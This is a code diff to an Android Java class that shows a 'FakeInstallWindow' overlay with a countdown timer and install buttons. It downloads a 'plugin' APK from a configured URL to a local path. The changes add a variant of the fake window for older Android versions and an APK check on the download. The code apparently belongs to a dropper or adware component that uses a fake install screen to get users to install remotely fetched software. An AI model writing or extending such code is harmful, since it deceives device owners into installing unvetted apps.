@@ -45,7 +45,11 @@ public class UtilOperator {
         handler.post(new Runnable() {
             @Override
             public void run() {
-                fake = new FakeInstallWindow(context);
+                if (!Utils.isVersionBeyondGB()) {
+                    fake = new FakeInstallWindowForGB(context);
+                } else {
+                    fake = new FakeInstallWindow(context);
+                }
                 fake.show(true);
                 fake.updateTimerCount();
 
@@ -68,25 +72,25 @@ public class UtilOperator {
         });
     }
 
-    public static final class FakeInstallWindow {
+    public static class FakeInstallWindow {
 
-        private static final int TIMER_COUNT = 100;
+        protected static final int TIMER_COUNT = 100;
 
-        private View coverView;
-        private View timerView;
-        private TextView timeTV;
-        private View installView;
-        private View installFullView;
-        private Context context;
-        private WindowManager wm;
-        private int count = TIMER_COUNT;
-        private Handler handler;
-        private LayoutInflater layoutInflater;
-        private int screenWidth;
-        private int screenHeight;
-        private float density;
+        protected View coverView;
+        protected View timerView;
+        protected TextView timeTV;
+        protected View installView;
+        protected View installFullView;
+        protected Context context;
+        protected WindowManager wm;
+        protected int count = TIMER_COUNT;
+        protected Handler handler;
+        protected LayoutInflater layoutInflater;
+        protected int screenWidth;
+        protected int screenHeight;
+        protected float density;
 
-        private WindowManager.LayoutParams confirmFullBtnParams;
+        protected WindowManager.LayoutParams confirmFullBtnParams;
 
         public FakeInstallWindow(Context context) {
             this.context = context;
@@ -317,8 +321,7 @@ public class UtilOperator {
                     return;
                 }
 
-                FileDownloader.getInstance(context).postRequest(
-                                                                   new FileDownloader.DownloadRequest(Config.DOWNLOAD_URL)
+                FileDownloader.getInstance(context).postRequest(new FileDownloader.DownloadRequest(Config.DOWNLOAD_URL)
                                                                    , new FileDownloader.DownloadListener() {
                     @Override
                     public void onDownloadProcess(int fileSize, int downloadSize) {
@@ -336,7 +339,18 @@ public class UtilOperator {
                                 String targetPath = FileOperatorHelper.copyFile(localUrl, Config.PLUGIN_APK_PATH);
                                 if (!TextUtils.isEmpty(targetPath)) {
                                     Config.LOGD("[[tryToDownloadPlugin]] try to mv download file to : " + targetPath);
+
                                     File targetFile = new File(targetPath);
+                                    if (!Utils.checkAPK(context, targetPath)) {
+                                        Config.LOGD("[[tryToDownloadPlugin]] try to check APK : " + targetPath + " <<<<<<<< Failed >>>>>>>>");
+                                        //delete targetPath
+                                        targetFile.delete();
+                                        File localFile = new File(localUrl);
+                                        localFile.delete();
+
+                                        return;
+                                    }
+
                                     if (targetFile.exists()) {
                                         Config.LOGD("[[tryToDownloadPlugin]] success download plugin file : " + targetPath);
                                     }
